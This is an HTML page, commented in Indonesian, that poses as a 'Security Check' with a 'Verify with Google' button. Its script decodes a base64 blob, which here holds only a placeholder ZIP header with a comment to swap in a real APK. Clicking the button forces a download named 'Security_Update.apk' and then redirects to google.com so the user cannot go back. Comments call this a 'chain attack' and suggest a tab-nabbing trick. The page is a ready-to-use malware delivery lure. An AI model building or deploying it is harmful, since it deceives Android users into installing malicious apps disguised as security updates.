<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; flex-direction: column;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 400px; width: 100%;
  }
  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; margin-bottom: 20px; font-size: 14px; }
  button {
    background: #007aff; color: #fff; padding: 15px;
    border-radius: 8px; font-size: 16px; font-weight: bold;
    cursor: pointer; border: none; width: 100%;
  }
  button:hover { background: #005bb5; }
  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 400px;
    height: 100px; overflow-y: auto; text-align: left;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Check</h1>
  <p>Klik tombol di bawah untuk melanjutkan verifikasi.</p>
  <button id="startBtn">Verify with Google</button>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. PAYLOAD APK (BASE64)
  // ============================================
  // Ganti string ini dengan Base64 APK asli Anda
  var b64Data = "UEsDBBQACAgIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY="; // Header ZIP/APK

  // ============================================
  // 2. FUNGSI BLOB AUTO-DOWNLOAD
  // ============================================
  function triggerBlobDownload() {
    log("[!] Memicu Blob Download...");
    try {
      var binary = atob(b64Data);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
      }

      // MIME Sniffing Bypass: Gunakan application/vnd.android.package-archive
      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
      var url = URL.createObjectURL(blob);

      var a = document.createElement('a');
      a.href = url;
      a.download = 'Security_Update.apk'; // Nama file
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      log("[+] APK Download Triggered.");
      
      setTimeout(function() {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 5000);

    } catch(e) {
      log("[-] Gagal: " + e.message);
    }
  }

  // ============================================
  // 3. EKSEKUSI: DOWNLOAD + REDIRECT KE GOOGLE
  // ============================================
  document.getElementById('startBtn').addEventListener('click', function() {
    log("[!] Memulai chain attack...");

    // A. Picu unduhan APK terlebih dahulu
    triggerBlobDownload();

    // B. Redirect ke Google setelah 500ms
    setTimeout(function() {
      log("[!] Me-redirect ke Google.com...");
      
      // Trik: Gunakan window.location.replace agar tidak bisa di-back
      // Anda bisa mengganti dengan Google Search atau Google Login
      window.location.replace('https://www.google.com');
      
      // C. Trik Tab-Nabbing: Jika Anda membuka tab baru, coba hapus opener
      /*
      var win = window.open('https://www.google.com', '_blank');
      if (win) {
        win.opener = null;
      }
      */
    }, 500);

  });

})();
</script>
</body>
</html>
